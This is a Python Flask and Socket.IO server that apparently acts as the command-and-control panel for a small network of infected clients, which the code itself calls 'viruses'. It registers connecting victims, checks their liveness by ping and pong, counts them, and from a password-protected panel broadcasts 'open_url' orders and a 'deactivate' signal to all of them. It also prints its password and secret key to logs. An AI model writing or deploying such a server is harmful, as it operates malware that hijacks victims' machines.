import eventlet#
eventlet.monkey_patch()
import os
import logging
from flask import Flask, render_template, session, request
from flask import url_for, redirect, flash
from flask_socketio import SocketIO, emit, disconnect

PASSWORD = os.getenv('PASSWORD')
QUANTITY_OF_VIRUSES = 0 

class Conf:
    SECRET_KEY = os.getenv('SECRET_KEY')
    #SESSION_COOKIE_SECURE = True
    DEBUG = True


def ping_pong():
    while True:
        try:
            eventlet.sleep(0.1)
            reserve_viruses_status = viruses_status.copy()
            for sid in reserve_viruses_status:
                print(f'[viruses_status] :: {reserve_viruses_status}')
                try:
                    viruses_status[sid] = False
                    sio.emit('ping', room=sid)
                    eventlet.sleep(1)

                    if viruses_status[sid] == False:
                        viruses_status.pop(sid)
                        print(f'[{sid}] has disconnected')
                        sio.emit('get_quantity_of_viruses', { 'quantity' : len(viruses_status) }, broadcast=True)
                    else:
                        print(f'[{sid}] is still connected')
                except KeyError:
                    print(f'[{sid}] has disconnected')
        except BaseException as e:
            print(e)


app = Flask(__name__)
app.config.from_object(Conf)
sio = SocketIO(app, 
	cors_allowed_origins=['http://localhost:5000', 'http://debik.pp.ua', 'https://debik.pp.ua', 'http://45.83.193.140', 'https://45.83.193.140'],
	engineio_logger=True)

gunicorn_error_logger = logging.getLogger('gunicorn.error')
app.logger.handlers.extend(gunicorn_error_logger.handlers)
app.logger.setLevel(logging.DEBUG)
app.logger.debug('this will show in the log')
app.logger.debug(f'PASSWORD: {PASSWORD}')
viruses_status = {}

@app.route('/test')
def test():
	return render_template('test.html')

@app.route('/', methods=["GET", "POST"])
def index():
    if request.method == "POST":
        password = request.form['password']
        if password == PASSWORD:
            session['is_passed'] = True
            print(session['is_passed'])
            return redirect(url_for('get_control_panel'))
        flash('Password is incorrect')

    return render_template('index.html')

@app.route('/control-panel/')
def get_control_panel():
    if 'is_passed' in session:
        if session['is_passed'] == True:
            return render_template('control_panel.html')
    return redirect(url_for('index'))

@sio.on('request_quantity')
def give_quantity():
    emit('get_quantity_of_viruses', { 'quantity' : len(viruses_status) }, broadcast=True)

@sio.on('virus_connected')
def virus_connected():
    viruses_status[request.sid] = None
    app.logger.debug(f'VIRUS[{request.sid}] CONNECTED')
    emit('get_quantity_of_viruses', { 'quantity' : len(viruses_status) }, broadcast=True)

@sio.on('message')
def handle_message(url):
    app.logger.debug(f'url : {url}')
    emit('open_url',{'url':url}, broadcast=True)#

@sio.on('deactivate')
def deactivate():
    app.logger.debug('Deactivaing each virus')
    emit('deactivate',broadcast=True)#

@sio.on('confirm_deactivate')
def confirm_deactivate():
    viruses_status.pop(request.sid)
    
    app.logger.debug(f'VIRUS[{request.sid}] DISCONNECTED')
    emit('finish_deactivating')
    emit('get_quantity_of_viruses', { 'quantity' : len(viruses_status) }, broadcast=True)

@sio.on('connect')
def connect():
    app.logger.debug('CONNECTED')

@sio.on('disconnect')
def disconnect():
    if request.sid in viruses_status:
        viruses_status.pop(request.sid)
        app.logger.debug(f'VIRUS[{request.sid}] DISCONNECTED')
        emit('get_quantity_of_viruses', { 'quantity' : len(viruses_status) }, broadcast=True)

@sio.on('pong')
def pong():
    viruses_status[request.sid] = True 

sio.start_background_task(ping_pong)

if __name__ == "__main__":
    print(f"[SECRET_KEY] :: {app.config['SECRET_KEY']}")
    print(f"[PASSWORD] :: {PASSWORD}")
    sio.run(app, debug=True)
